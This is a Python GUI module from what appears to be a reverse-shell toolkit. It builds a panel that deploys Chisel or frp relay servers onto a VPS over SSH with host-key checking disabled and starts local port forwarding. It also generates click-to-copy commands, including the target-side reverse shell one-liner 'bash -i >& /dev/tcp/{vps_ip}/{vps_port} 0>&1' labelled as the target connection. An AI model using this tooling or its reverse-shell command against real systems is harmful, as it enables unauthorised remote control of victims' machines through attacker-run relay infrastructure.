import sys
from pathlib import Path

MODULE_DIR = Path(__file__).resolve().parent
if str(MODULE_DIR) not in sys.path:
    sys.path.insert(0, str(MODULE_DIR))

import os
import subprocess
import tempfile
import threading

import customtkinter as ctk

from revshell_templates import CHISEL_CONTROL_PORT, FRP_CONTROL_PORT
from revshell_theme import ACCENT, ACCENT_LIGHT, BG_CARD, BG_HOVER, BG_INPUT, GREEN, MONO_S, ORANGE, R, R_CARD, TEXT, TEXT_SEC, TEXT_TER, RED
from revshell_utils import normalize_port, terminate_process


class VpsPanel:
    def build_vps(self, parent):
        parent.grid_columnconfigure(0, weight=1)
        parent.grid_rowconfigure(5, weight=1)
        self._ssh_proc = None
        self._ssh_thread = None
        self._local_fwd_proc = None
        self._local_fwd_cfg = None

        ssh_card = ctk.CTkFrame(parent, corner_radius=R_CARD, fg_color=BG_CARD, border_width=0)
        ssh_card.grid(row=0, column=0, sticky="ew", pady=(0, 8))
        ssh_card.grid_columnconfigure(1, weight=1)

        ctk.CTkLabel(ssh_card, text="SSH", font=("pingfang sc", 11, "bold"), text_color=ACCENT).grid(row=0, column=0, padx=(16, 8), pady=10)
        self._ssh_user_var = ctk.StringVar(value="root")
        ctk.CTkEntry(ssh_card, textvariable=self._ssh_user_var, width=90, height=28, font=MONO_S,
                     corner_radius=6, fg_color=BG_INPUT, border_width=0, text_color=TEXT, placeholder_text="user"
                     ).grid(row=0, column=1, sticky="w", padx=(0, 2), pady=10)
        ctk.CTkLabel(ssh_card, text="@", font=MONO_S, text_color=TEXT_TER).grid(row=0, column=2, padx=2)

        self._vps_ip_var = ctk.StringVar(value="")
        ctk.CTkEntry(ssh_card, textvariable=self._vps_ip_var, width=140, height=28, font=MONO_S,
                     corner_radius=6, fg_color=BG_INPUT, border_width=0, text_color=TEXT, placeholder_text="VPS IP"
                     ).grid(row=0, column=3, padx=(0, 2), pady=10)
        ctk.CTkLabel(ssh_card, text="-p", font=MONO_S, text_color=TEXT_TER).grid(row=0, column=4, padx=(4, 2))
        self._ssh_port_var = ctk.StringVar(value="22")
        ctk.CTkEntry(ssh_card, textvariable=self._ssh_port_var, width=50, height=28, font=MONO_S,
                     corner_radius=6, fg_color=BG_INPUT, border_width=0, text_color=TEXT
                     ).grid(row=0, column=5, padx=(0, 8), pady=10)
        ctk.CTkLabel(ssh_card, text="密钥", font=("pingfang sc", 10), text_color=TEXT_SEC).grid(row=0, column=6, padx=(0, 4), pady=10)
        self._ssh_key_var = ctk.StringVar(value="")
        ctk.CTkEntry(ssh_card, textvariable=self._ssh_key_var, width=140, height=28, font=MONO_S,
                     corner_radius=6, fg_color=BG_INPUT, border_width=0, text_color=TEXT,
                     placeholder_text="~/.ssh/id_rsa（可选）"
                     ).grid(row=0, column=7, padx=(0, 12), pady=10)

        fwd_card = ctk.CTkFrame(parent, corner_radius=R_CARD, fg_color=BG_CARD, border_width=0)
        fwd_card.grid(row=1, column=0, sticky="ew", pady=(0, 8))
        fwd_card.grid_columnconfigure(3, weight=1)
        ctk.CTkLabel(fwd_card, text="方式", font=("pingfang sc", 10), text_color=TEXT_SEC).grid(row=0, column=0, padx=(16, 4), pady=10)
        self._vps_method_var = ctk.StringVar(value="Chisel")
        ctk.CTkSegmentedButton(
            fwd_card, values=["Chisel", "frp"], variable=self._vps_method_var, command=lambda _: self._gen_vps(),
            font=("pingfang sc", 12), corner_radius=8, selected_color=ACCENT, selected_hover_color=ACCENT,
            unselected_color=BG_INPUT, unselected_hover_color=BG_HOVER, text_color=TEXT,
        ).grid(row=0, column=1, padx=(0, 20), pady=10)
        ctk.CTkLabel(fwd_card, text="VPS端口", font=("pingfang sc", 10), text_color=TEXT_SEC).grid(row=0, column=2, padx=(0, 4), pady=10)
        self._vps_port_var = ctk.StringVar(value="4444")
        ctk.CTkEntry(fwd_card, textvariable=self._vps_port_var, width=70, height=28, font=MONO_S,
                     corner_radius=6, fg_color=BG_INPUT, border_width=0, text_color=TEXT
                     ).grid(row=0, column=3, sticky="w", padx=(0, 20), pady=10)
        ctk.CTkLabel(fwd_card, text="本地端口", font=("pingfang sc", 10), text_color=TEXT_SEC).grid(row=0, column=4, padx=(0, 4), pady=10)
        self._local_port_var = ctk.StringVar(value="4444")
        ctk.CTkEntry(fwd_card, textvariable=self._local_port_var, width=70, height=28, font=MONO_S,
                     corner_radius=6, fg_color=BG_INPUT, border_width=0, text_color=TEXT
                     ).grid(row=0, column=5, padx=(0, 16), pady=10)

        btn_bar = ctk.CTkFrame(parent, fg_color="transparent")
        btn_bar.grid(row=2, column=0, sticky="ew", pady=(0, 8))
        self._vps_deploy_btn = ctk.CTkButton(
            btn_bar, text="VPS 一键部署服务端", width=160, height=32, font=("pingfang sc", 12, "bold"),
            corner_radius=R, fg_color=ACCENT, hover_color="#0066d6", text_color="#ffffff",
            command=self._vps_deploy_server,
        )
        self._vps_deploy_btn.pack(side="left", padx=(0, 8))
        self._vps_local_btn = ctk.CTkButton(
            btn_bar, text="本地启动客户端转发", width=160, height=32, font=("pingfang sc", 12, "bold"),
            corner_radius=R, fg_color=GREEN, hover_color="#2db84d", text_color="#ffffff",
            command=self._vps_start_local,
        )
        self._vps_local_btn.pack(side="left", padx=(0, 8))
        self._vps_stop_btn = ctk.CTkButton(
            btn_bar, text="停止全部", width=80, height=32, font=("pingfang sc", 10),
            corner_radius=R, fg_color=BG_INPUT, hover_color=BG_HOVER, text_color=TEXT_SEC,
            command=self._vps_stop_all,
        )
        self._vps_stop_btn.pack(side="left")

        log_card = ctk.CTkFrame(parent, corner_radius=R_CARD, fg_color=BG_CARD, border_width=0)
        log_card.grid(row=3, column=0, sticky="ew", pady=(0, 8))
        log_hdr = ctk.CTkFrame(log_card, fg_color="transparent")
        log_hdr.pack(fill="x", padx=14, pady=(10, 0))
        ctk.CTkLabel(log_hdr, text="● 操作日志", font=("pingfang sc", 11, "bold"), text_color=ORANGE).pack(side="left")
        self._vps_log_box = ctk.CTkTextbox(
            log_card, font=MONO_S, fg_color=BG_INPUT, corner_radius=8, text_color=TEXT,
            wrap="word", state="disabled", border_width=0, height=80,
        )
        self._vps_log_box.pack(fill="x", padx=14, pady=(6, 10))

        hdr = ctk.CTkFrame(parent, fg_color="transparent")
        hdr.grid(row=4, column=0, sticky="w", pady=(0, 4))
        ctk.CTkLabel(hdr, text="命令参考", font=("pingfang sc", 13, "bold"), text_color=TEXT).pack(side="left", padx=4)
        ctk.CTkLabel(hdr, text="（点击复制）", font=("pingfang sc", 10), text_color=TEXT_TER).pack(side="left", padx=(4, 0))

        self._vps_output = ctk.CTkScrollableFrame(parent, fg_color=BG_CARD, corner_radius=R_CARD,
                                                  scrollbar_button_color=BG_INPUT, scrollbar_button_hover_color=TEXT_TER)
        self._vps_output.grid(row=5, column=0, sticky="nsew")
        self._vps_output.grid_columnconfigure(0, weight=1)

        for var in (self._vps_ip_var, self._vps_port_var, self._local_port_var):
            var.trace_add("write", lambda *_: self._gen_vps())
        self._gen_vps()

    def _gen_vps(self):
        vps_ip = self._vps_ip_var.get().strip()
        vps_port = normalize_port(self._vps_port_var.get(), "4444")
        local_port = normalize_port(self._local_port_var.get(), "4444")
        method = self._vps_method_var.get()

        for w in self._vps_output.winfo_children():
            w.destroy()
        if not vps_ip:
            self._render_message(self._vps_output, "请输入 VPS IP 地址")
            return
        if not vps_port or not local_port:
            self._render_message(self._vps_output, "VPS端口和本地端口必须是 1-65535", RED)
            return

        if method == "frp":
            cmds = [
                ("1. VPS 上启动 frps", f"frps -p {FRP_CONTROL_PORT}"),
                ("2. 本地一键启动 frpc", f"frpc -c <(echo 'serverAddr = \"{vps_ip}\"\\nserverPort = {FRP_CONTROL_PORT}\\n\\n[[proxies]]\\nname = \"revshell\"\\ntype = \"tcp\"\\nlocalIP = \"127.0.0.1\"\\nlocalPort = {local_port}\\nremotePort = {vps_port}')"),
                ("3. 或者用 frpc.toml", f"# frpc.toml\nserverAddr = \"{vps_ip}\"\nserverPort = {FRP_CONTROL_PORT}\n\n[[proxies]]\nname = \"revshell\"\ntype = \"tcp\"\nlocalIP = \"127.0.0.1\"\nlocalPort = {local_port}\nremotePort = {vps_port}"),
                ("4. 目标反弹 Shell 连接", f"bash -i >& /dev/tcp/{vps_ip}/{vps_port} 0>&1"),
            ]
        else:
            cmds = [
                ("1. VPS 上启动 Chisel 服务端", f"chisel server -p {CHISEL_CONTROL_PORT} --reverse"),
                ("2. 本地启动 Chisel 客户端（转发端口）", f"chisel client {vps_ip}:{CHISEL_CONTROL_PORT} R:{vps_port}:127.0.0.1:{local_port}"),
                ("3. 目标反弹 Shell 连接", f"bash -i >& /dev/tcp/{vps_ip}/{vps_port} 0>&1"),
            ]

        for title, cmd in cmds:
            card = ctk.CTkFrame(self._vps_output, corner_radius=10, fg_color=ACCENT_LIGHT if "目标" in title else BG_INPUT, border_width=0)
            card.pack(fill="x", pady=4, padx=4)
            card.grid_columnconfigure(0, weight=1)
            t_frame = ctk.CTkFrame(card, fg_color="transparent")
            t_frame.grid(row=0, column=0, sticky="w", padx=14, pady=(10, 0))
            color = ACCENT if "目标" in title else TEXT
            ctk.CTkLabel(t_frame, text=title, font=("pingfang sc", 11, "bold"), text_color=color).pack(side="left")
            cmd_lbl = ctk.CTkLabel(card, text=cmd, font=MONO_S, text_color=TEXT, wraplength=700, justify="left", anchor="w", cursor="hand2")
            cmd_lbl.grid(row=1, column=0, sticky="ew", padx=14, pady=(6, 4))
            bot = ctk.CTkFrame(card, fg_color="transparent")
            bot.grid(row=2, column=0, sticky="ew", padx=14, pady=(0, 10))
            ctk.CTkButton(bot, text="复制", width=56, height=24, font=("pingfang sc", 10),
                          corner_radius=6, fg_color=ACCENT, hover_color="#0066d6", text_color="#ffffff",
                          command=lambda t=cmd: self._copy(t)).pack(side="right")
            cmd_lbl.bind("<ButtonPress-1>", lambda e, t=cmd: self._copy(t))

    def _vps_log(self, text):
        self._vps_log_box.configure(state="normal")
        self._vps_log_box.insert("end", text)
        self._vps_log_box.see("end")
        self._vps_log_box.configure(state="disabled")

    def _vps_deploy_server(self):
        vps_ip = self._vps_ip_var.get().strip()
        user = self._ssh_user_var.get().strip() or "root"
        ssh_port = normalize_port(self._ssh_port_var.get(), "22")
        key = self._ssh_key_var.get().strip()
        method = self._vps_method_var.get()
        if not vps_ip:
            self._vps_log("[!] 请输入 VPS IP\n")
            return
        if not ssh_port:
            self._vps_log("[!] SSH 端口无效，请输入 1-65535\n")
            return

        ssh_args = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10", "-p", ssh_port]
        if key:
            ssh_args.extend(["-i", os.path.expanduser(key)])
        ssh_args.append(f"{user}@{vps_ip}")
        if method == "frp":
            remote_cmd = f"pkill frps 2>/dev/null; nohup frps -p {FRP_CONTROL_PORT} > /tmp/frps.log 2>&1 & sleep 1; echo 'frps started on port {FRP_CONTROL_PORT}'"
        else:
            remote_cmd = f"pkill -f 'chisel server' 2>/dev/null; nohup chisel server -p {CHISEL_CONTROL_PORT} --reverse > /tmp/chisel.log 2>&1 & sleep 1; echo 'chisel server started on port {CHISEL_CONTROL_PORT}'"
        ssh_args.append(remote_cmd)
        self._vps_log(f"[*] 连接 {user}@{vps_ip} -p {ssh_port} ...\n")
        self._vps_deploy_btn.configure(state="disabled")

        def _run():
            try:
                proc = subprocess.Popen(ssh_args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
                for line in proc.stdout:
                    self.root.after(0, self._vps_log, line)
                proc.wait()
                if proc.returncode == 0:
                    self.root.after(0, self._vps_log, "[+] 服务端部署成功\n")
                    self.root.after(0, lambda: self._status.configure(text="VPS 服务端已启动"))
                else:
                    self.root.after(0, self._vps_log, f"[!] 部署失败 (code={proc.returncode})\n")
            except Exception as e:
                self.root.after(0, self._vps_log, f"[!] 错误: {e}\n")
            finally:
                self.root.after(0, lambda: self._vps_deploy_btn.configure(state="normal"))

        threading.Thread(target=_run, daemon=True).start()

    def _vps_start_local(self):
        vps_ip = self._vps_ip_var.get().strip()
        method = self._vps_method_var.get()
        vps_port = normalize_port(self._vps_port_var.get(), "4444")
        local_port = normalize_port(self._local_port_var.get(), "4444")
        if not vps_ip:
            self._vps_log("[!] 请输入 VPS IP\n")
            return
        if not vps_port or not local_port:
            self._vps_log("[!] VPS端口和本地端口必须是 1-65535\n")
            return
        if self._local_fwd_proc and self._local_fwd_proc.poll() is None:
            self._vps_log("[!] 本地转发已在运行，请先停止\n")
            return

        root_dir = Path(__file__).parent.parent.parent
        if method == "frp":
            frpc_paths = [str(root_dir / "信息收集" / "frp" / "frpc"), "/opt/homebrew/bin/frpc", "/usr/local/bin/frpc"]
            frpc = next((p for p in frpc_paths if Path(p).exists()), "frpc")
            config = f'serverAddr = "{vps_ip}"\nserverPort = {FRP_CONTROL_PORT}\n\n[[proxies]]\nname = "revshell"\ntype = "tcp"\nlocalIP = "127.0.0.1"\nlocalPort = {local_port}\nremotePort = {vps_port}'
            with tempfile.NamedTemporaryFile("w", suffix=".toml", delete=False, encoding="utf-8") as f:
                f.write(config)
                cfg_path = Path(f.name)
            cmd = [frpc, "-c", str(cfg_path)]
            self._local_fwd_cfg = cfg_path
        else:
            chisel_paths = [str(root_dir / "信息收集" / "chisel" / "chisel")]
            chisel = next((p for p in chisel_paths if Path(p).exists()), "chisel")
            cmd = [chisel, "client", f"{vps_ip}:{CHISEL_CONTROL_PORT}", f"R:{vps_port}:127.0.0.1:{local_port}"]

        self._vps_log(f"[*] 启动: {' '.join(cmd)}\n")
        self._vps_local_btn.configure(state="disabled", text="运行中...")

        def _run():
            try:
                self._local_fwd_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, start_new_session=True)
                for line in self._local_fwd_proc.stdout:
                    self.root.after(0, self._vps_log, line)
                self._local_fwd_proc.wait()
            except FileNotFoundError:
                self.root.after(0, self._vps_log, f"[!] 找不到: {cmd[0]}\n")
            except Exception as e:
                self.root.after(0, self._vps_log, f"[!] 错误: {e}\n")
            finally:
                self.root.after(0, self._on_local_fwd_done)

        threading.Thread(target=_run, daemon=True).start()

    def _on_local_fwd_done(self):
        self._vps_local_btn.configure(state="normal", text="本地启动客户端转发")
        self._local_fwd_proc = None
        self._cleanup_local_fwd_cfg()
        self._vps_log("[*] 本地转发已停止\n")

    def _cleanup_local_fwd_cfg(self):
        if self._local_fwd_cfg:
            try:
                self._local_fwd_cfg.unlink()
            except OSError:
                pass
            self._local_fwd_cfg = None

    def _vps_stop_all(self):
        if self._local_fwd_proc and self._local_fwd_proc.poll() is None:
            terminate_process(self._local_fwd_proc)
            self._vps_log("[*] 已停止本地转发进程\n")
            self._local_fwd_proc = None
        self._cleanup_local_fwd_cfg()

        vps_ip = self._vps_ip_var.get().strip()
        if vps_ip:
            user = self._ssh_user_var.get().strip() or "root"
            ssh_port = normalize_port(self._ssh_port_var.get(), "22")
            key = self._ssh_key_var.get().strip()
            method = self._vps_method_var.get()
            if not ssh_port:
                self._vps_log("[!] SSH 端口无效，请输入 1-65535\n")
                return

            ssh_args = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10", "-p", ssh_port]
            if key:
                ssh_args.extend(["-i", os.path.expanduser(key)])
            ssh_args.append(f"{user}@{vps_ip}")
            ssh_args.append("pkill frps 2>/dev/null && echo 'frps stopped' || echo 'frps not running'" if method == "frp" else "pkill -f 'chisel server' 2>/dev/null && echo 'chisel stopped' || echo 'chisel not running'")

            self._vps_log(f"[*] 停止远程 {user}@{vps_ip} ...\n")

            def _run():
                try:
                    proc = subprocess.run(ssh_args, capture_output=True, text=True, timeout=15)
                    msg = proc.stdout.strip() or proc.stderr.strip()
                    self.root.after(0, self._vps_log, f"  {msg}\n[+] 远程已停止\n")
                except subprocess.TimeoutExpired:
                    self.root.after(0, self._vps_log, "[!] 连接超时\n")
                except Exception as e:
                    self.root.after(0, self._vps_log, f"[!] 错误: {e}\n")

            threading.Thread(target=_run, daemon=True).start()

        self._vps_local_btn.configure(state="normal", text="本地启动客户端转发")
        self._status.configure(text="全部已停止")
